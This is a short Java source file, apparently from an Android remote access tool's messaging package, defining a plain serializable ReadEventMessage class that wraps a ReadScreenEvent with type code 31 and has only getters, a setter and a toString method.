package com.vendor.rat.network.msg;

import androidx.annotation.NonNull;
import java.io.Serializable;

public class ReadEventMessage implements Serializable {
    private ReadScreenEvent body;
    private final Integer type = 31;

    public ReadEventMessage(ReadScreenEvent readScreenEvent) {
        this.body = readScreenEvent;
    }

    public ReadScreenEvent getBody() {
        return this.body;
    }

    public Integer getType() {
        return this.type;
    }

    public void setBody(ReadScreenEvent readScreenEvent) {
        this.body = readScreenEvent;
    }

    @NonNull
    public String toString() {
        return "ReadEventMessage{type=" + this.type + ", body=" + this.body + '}';
    }
}
